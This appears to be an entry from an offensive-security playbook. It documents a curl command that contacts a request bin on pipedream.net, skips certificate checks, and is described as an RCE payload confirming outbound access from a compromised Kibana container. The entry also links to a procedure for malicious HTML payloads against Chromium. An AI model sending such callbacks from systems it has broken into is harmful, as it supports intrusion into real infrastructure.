---
data: 'curl -k https://enu8lspgwcj2k.x.pipedream.net/?hifromelasticcloud'
tags:
  - rce
  - outbound-request
type: command
output: HTTP request logged on pipedream.net
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:37.176Z'
id: 127367ae-33d8-444c-9c97-2c3779c0a02a
verified: false
validated: true
submitted: true
---
# curl-payload-test

## Command

```bash
curl -k https://enu8lspgwcj2k.x.pipedream.net/?hifromelasticcloud
```

## Description

RCE payload command to make an outbound HTTPS request to a request bin, demonstrating network access from the compromised Kibana container, skipping SSL verification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Insecure mode, ignore SSL cert errors | Yes |
| URL | Request bin endpoint with query | Yes |

## Examples

### Basic Usage

```bash
curl -k https://enu8lspgwcj2k.x.pipedream.net/?hifromelasticcloud
```

## Expected Output

HTTP 200 or request logged remotely; minimal stdout if successful.

## Related

- [[tools/Pipedream.net]]
- [[procedures/Host-Malicious-HTML-Payload-for-Chromium-RCE]]
